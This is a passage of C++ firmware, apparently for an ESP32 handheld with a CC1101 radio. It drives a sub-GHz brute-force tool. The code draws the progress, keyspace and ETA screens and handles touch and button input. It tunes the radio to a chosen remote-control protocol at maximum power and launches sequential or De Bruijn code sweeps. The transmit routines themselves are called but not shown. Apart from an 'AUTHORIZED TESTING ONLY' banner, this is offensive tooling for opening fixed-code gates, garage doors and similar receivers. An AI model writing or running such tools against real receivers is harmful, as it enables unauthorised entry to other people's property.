        uint32_t done = currentCode - startCode;
        progress = (total > 0) ? (done * 100.0 / total) : 0;
    }

    tft.setTextColor(TFT_CYAN, TFT_BLACK);
    tft.setCursor(10, 120);
    tft.print("Progress: ");
    tft.setTextColor(TFT_WHITE, TFT_BLACK);
    tft.printf("%.1f%%", progress);

    // Current position display
    tft.setTextColor(TFT_CYAN, TFT_BLACK);
    tft.setCursor(10, 135);
    if (useDeBruijn && bruteRunning) {
        tft.print("Bits: ");
        tft.setTextColor(TFT_WHITE, TFT_BLACK);
        tft.printf("%lu / %lu", deBruijnBit, deBruijnLength);
    } else {
        tft.print("Code: ");
        tft.setTextColor(TFT_WHITE, TFT_BLACK);
        tft.printf("%lu / %lu", currentCode, endCode);
    }

    // Progress bar
    int barWidth = 200;
    int barHeight = 20;
    int barX = 20;
    int barY = 155;
    int fillWidth = (progress * barWidth) / 100;

    tft.drawRect(barX - 1, barY - 1, barWidth + 2, barHeight + 2, TFT_WHITE);
    tft.fillRect(barX, barY, barWidth, barHeight, TFT_DARKGREY);

    uint16_t barColor = TFT_GREEN;
    if (progress < 33) barColor = TFT_RED;
    else if (progress < 66) barColor = TFT_YELLOW;

    if (fillWidth > 0) {
        tft.fillRect(barX, barY, fillWidth, barHeight, barColor);
    }

    // Time elapsed
    unsigned long elapsed = (millis() - startTime) / 1000;
    tft.setTextColor(TFT_CYAN, TFT_BLACK);
    tft.setCursor(10, 185);
    tft.print("Time: ");
    tft.setTextColor(TFT_WHITE, TFT_BLACK);
    tft.printf("%lu:%02lu", elapsed / 60, elapsed % 60);

    // ETA
    if (progress > 0 && progress < 100) {
        unsigned long eta = (elapsed * (100 - progress)) / progress;
        tft.setCursor(100, 185);
        tft.setTextColor(TFT_CYAN, TFT_BLACK);
        tft.print("ETA: ");
        tft.setTextColor(TFT_WHITE, TFT_BLACK);
        tft.printf("%lu:%02lu", eta / 60, eta % 60);
    }

    // Status
    tft.setCursor(10, 205);
    if (bruteRunning) {
        if (brutePaused) {
            tft.setTextColor(TFT_YELLOW, TFT_BLACK);
            tft.print("PAUSED - DOWN to resume, UP to stop");
        } else {
            tft.setTextColor(TFT_RED, TFT_BLACK);
            tft.print("ATTACKING - UP=Stop DOWN=Pause");
        }
    } else {
        tft.setTextColor(TFT_GREEN, TFT_BLACK);
        tft.print("READY - UP=Start");
    }
}

void drawHeader() {
    tft.fillRect(0, 0, 240, 75, TFT_BLACK);

    // Title
    tft.setTextColor(ORANGE, TFT_BLACK);
    tft.setTextSize(1);
    tft.setCursor(50, 5);
    tft.print("SUB-GHz BRUTE FORCE");

    // Warning
    tft.setTextColor(TFT_RED, TFT_BLACK);
    tft.setCursor(30, 20);
    tft.print("AUTHORIZED TESTING ONLY");

    tft.drawLine(0, 35, 240, 35, ORANGE);

    // Protocol selection
    tft.setTextColor(TFT_WHITE, TFT_BLACK);
    tft.setCursor(10, 42);
    tft.print("< ");
    tft.setTextColor(TFT_CYAN, TFT_BLACK);
    tft.print(protocols[currentProtocol].name);
    tft.setTextColor(TFT_WHITE, TFT_BLACK);
    tft.print(" >");

    // Keyspace info
    uint32_t keyspace = 1UL << protocols[currentProtocol].bitLength;
    tft.setTextColor(TFT_YELLOW, TFT_BLACK);
    tft.setCursor(10, 57);
    tft.printf("Keyspace: %lu codes", keyspace);

    // Estimated time
    float timePerCode = 0.1;  // ~100ms per code average
    float totalTime = keyspace * timePerCode;
    tft.setCursor(140, 57);
    tft.printf("~%.0fs", totalTime);

    tft.drawLine(0, 72, 240, 72, ORANGE);
}

void runUI() {
    #define STATUS_BAR_Y_OFFSET 20
    #define STATUS_BAR_HEIGHT 16
    #define ICON_SIZE 16
    #define ICON_NUM 5

    static int iconX[ICON_NUM] = {50, 90, 130, 170, 10};
    static int iconY = STATUS_BAR_Y_OFFSET;

    static const unsigned char* icons[ICON_NUM] = {
        bitmap_icon_power,           // Start/Stop
        bitmap_icon_sort_down_minus, // Prev protocol
        bitmap_icon_sort_up_plus,    // Next protocol
        bitmap_icon_random,          // Toggle De Bruijn
        bitmap_icon_go_back          // Back
    };

    if (!uiDrawn) {
        tft.drawLine(0, 19, 240, 19, TFT_WHITE);
        tft.fillRect(0, STATUS_BAR_Y_OFFSET, SCREEN_WIDTH, STATUS_BAR_HEIGHT, DARK_GRAY);

        for (int i = 0; i < ICON_NUM; i++) {
            if (icons[i] != NULL) {
                tft.drawBitmap(iconX[i], iconY, icons[i], ICON_SIZE, ICON_SIZE, TFT_WHITE);
            }
        }
        tft.drawLine(0, STATUS_BAR_Y_OFFSET + STATUS_BAR_HEIGHT, SCREEN_WIDTH,
                     STATUS_BAR_Y_OFFSET + STATUS_BAR_HEIGHT, ORANGE);
        uiDrawn = true;
    }

    static unsigned long lastAnimationTime = 0;
    static int animationState = 0;
    static int activeIcon = -1;

    if (animationState > 0 && millis() - lastAnimationTime >= 150) {
        if (animationState == 1) {
            tft.drawBitmap(iconX[activeIcon], iconY, icons[activeIcon],
                          ICON_SIZE, ICON_SIZE, TFT_WHITE);
            animationState = 2;

            switch (activeIcon) {
                case 0: // Start/Stop
                    if (!bruteRunning) {
                        // Start attack
                        startCode = 0;
                        endCode = (1UL << protocols[currentProtocol].bitLength) - 1;
                        currentCode = startCode;
                        maxCode = endCode;
                        startTime = millis();
                        bruteRunning = true;
                        brutePaused = false;

                        // Set frequency
                        ELECHOUSE_cc1101.setMHZ(protocols[currentProtocol].frequency / 1000000.0);

                        if (useDeBruijn) {
                            transmitDeBruijnStream(protocols[currentProtocol]);
                        } else {
                            runSequentialBrute(protocols[currentProtocol]);
                        }
                        bruteRunning = false;
                    } else {
                        bruteRunning = false;
                    }
                    drawHeader();
                    updateBruteDisplay();
                    break;

                case 1: // Prev protocol
                    if (!bruteRunning) {
                        currentProtocol = (currentProtocol - 1 + PROTO_COUNT) % PROTO_COUNT;
                        ELECHOUSE_cc1101.setMHZ(protocols[currentProtocol].frequency / 1000000.0);
                        drawHeader();
                        updateBruteDisplay();
                    }
                    break;

                case 2: // Next protocol
                    if (!bruteRunning) {
                        currentProtocol = (currentProtocol + 1) % PROTO_COUNT;
                        ELECHOUSE_cc1101.setMHZ(protocols[currentProtocol].frequency / 1000000.0);
                        drawHeader();
                        updateBruteDisplay();
                    }
                    break;

                case 3: // Toggle De Bruijn
                    if (!bruteRunning) {
                        useDeBruijn = !useDeBruijn;
                        drawHeader();
                        updateBruteDisplay();
                    }
                    break;

                case 4: // Back
                    feature_exit_requested = true;
                    break;
            }
        } else if (animationState == 2) {
            animationState = 0;
            activeIcon = -1;
        }
        lastAnimationTime = millis();
    }

    // Touch handling
    static unsigned long lastTouchCheck = 0;
    const unsigned long touchCheckInterval = 50;

    if (millis() - lastTouchCheck >= touchCheckInterval) {
        if (ts.touched() && feature_active) {
            TS_Point p = ts.getPoint();
            int x = ::map(p.x, 300, 3800, 0, SCREEN_WIDTH - 1);
            int y = ::map(p.y, 3800, 300, 0, SCREEN_HEIGHT - 1);

            if (y > STATUS_BAR_Y_OFFSET && y < STATUS_BAR_Y_OFFSET + STATUS_BAR_HEIGHT) {
                for (int i = 0; i < ICON_NUM; i++) {
                    if (x > iconX[i] && x < iconX[i] + ICON_SIZE) {
                        if (icons[i] != NULL && animationState == 0) {
                            tft.drawBitmap(iconX[i], iconY, icons[i],
                                          ICON_SIZE, ICON_SIZE, TFT_BLACK);
                            animationState = 1;
                            activeIcon = i;
                            lastAnimationTime = millis();
                        }
                        break;
                    }
                }
            }
        }
        lastTouchCheck = millis();
    }
}

void subBruteSetup() {
    Serial.begin(115200);

    // NRF24 cleanup - release pins and SPI bus before CC1101 init
    pinMode(17, OUTPUT);
    digitalWrite(17, HIGH);        // Deselect NRF24 CSN
    SPI.end();                      // Release SPI bus
    delay(10);
    pinMode(16, INPUT);            // Reconfigure pin 16 for CC1101 GDO0/RX
    Serial.println("[SubGHz] NRF24 cleanup - SPI released for CC1101");

    // FIX BUG 5: Clean up any leftover De Bruijn state from previous run
    cleanupDeBruijn();

    // Set GDO0 pin BEFORE Init()
    ELECHOUSE_cc1101.setGDO0(RX_PIN);
    ELECHOUSE_cc1101.Init();
    ELECHOUSE_cc1101.setModulation(2);  // ASK/OOK
    ELECHOUSE_cc1101.setMHZ(protocols[currentProtocol].frequency / 1000000.0);
    ELECHOUSE_cc1101.setPA(12);         // Max power

    // Initialize RMT peripheral for hardware-timed OOK transmission
    if (!initRMT()) {
        Serial.println("[ERROR] RMT init failed - falling back to software timing");
    }

    bruteSwitch.enableTransmit(TX_PIN);

    pcf.pinMode(BTN_LEFT, INPUT_PULLUP);
    pcf.pinMode(BTN_RIGHT, INPUT_PULLUP);
    pcf.pinMode(BTN_DOWN, INPUT_PULLUP);
    pcf.pinMode(BTN_UP, INPUT_PULLUP);

    tft.setRotation(0);
    tft.fillScreen(TFT_BLACK);

    setupTouchscreen();

    float currentBatteryVoltage = readBatteryVoltage();
    drawStatusBar(currentBatteryVoltage, false);

    drawHeader();
    updateBruteDisplay();
    uiDrawn = false;

    bruteRunning = false;
    brutePaused = false;
    currentCode = 0;
}

void subBruteLoop() {
    runUI();

    static unsigned long lastDebounceTime = 0;
    const unsigned long debounceDelay = 200;

    // Button controls when not attacking
    if (!bruteRunning) {
        if (pcf.digitalRead(BTN_LEFT) == LOW && millis() - lastDebounceTime > debounceDelay) {
            currentProtocol = (currentProtocol - 1 + PROTO_COUNT) % PROTO_COUNT;
            ELECHOUSE_cc1101.setMHZ(protocols[currentProtocol].frequency / 1000000.0);
            drawHeader();
            updateBruteDisplay();
            lastDebounceTime = millis();
        }

        if (pcf.digitalRead(BTN_RIGHT) == LOW && millis() - lastDebounceTime > debounceDelay) {
            currentProtocol = (currentProtocol + 1) % PROTO_COUNT;
            ELECHOUSE_cc1101.setMHZ(protocols[currentProtocol].frequency / 1000000.0);
            drawHeader();
            updateBruteDisplay();
            lastDebounceTime = millis();
        }

        if (pcf.digitalRead(BTN_UP) == LOW && millis() - lastDebounceTime > debounceDelay) {
            // Start attack
            startCode = 0;
            endCode = (1UL << protocols[currentProtocol].bitLength) - 1;
            currentCode = startCode;
            maxCode = endCode;
            startTime = millis();
            bruteRunning = true;
            brutePaused = false;

            drawHeader();

            if (useDeBruijn) {
                transmitDeBruijnStream(protocols[currentProtocol]);
            } else {
                runSequentialBrute(protocols[currentProtocol]);
            }

            bruteRunning = false;
            updateBruteDisplay();
            lastDebounceTime = millis();
        }

        if (pcf.digitalRead(BTN_DOWN) == LOW && millis() - lastDebounceTime > debounceDelay) {
            useDeBruijn = !useDeBruijn;
            drawHeader();
            updateBruteDisplay();
            lastDebounceTime = millis();
        }
    }

    // Update display periodically during attack
    if (bruteRunning && millis() - lastDisplayUpdate > 500) {
        updateBruteDisplay();
    }
}

}  // namespace subbrute
